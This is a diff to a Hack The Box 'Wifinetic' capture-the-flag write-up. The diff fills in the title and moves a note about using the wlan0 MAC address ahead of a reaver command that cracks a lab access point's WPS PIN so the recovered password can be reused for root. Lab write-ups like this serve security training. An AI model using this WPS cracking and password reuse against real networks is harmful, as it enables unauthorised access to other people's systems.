@@ -1,4 +1,4 @@
-# HTB 
+# HTB Wifinetic
 
 **Machine Information**
 
@@ -127,11 +127,18 @@ There is already a network adaptor in monitoring mode.
 
 Using this information we can start running `reaver` to crack the WPS PIN.
 
+**NOTE:** after waiting far too long I realised you need to use the MAC address for `wlan0`
+
+```
+3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
+```
+
+With the correct MAC address we can crack the WPS PIN.
+
 ```
 reaver -i mon0 -b 02:00:00:00:00:00 -S -v
 ```
-
-**NOTE:** after waiting far too long I realised you need to use the MAC address for `wlan0`
 
 This will reveal a password that we can try to reuse to access the `root` user.
 
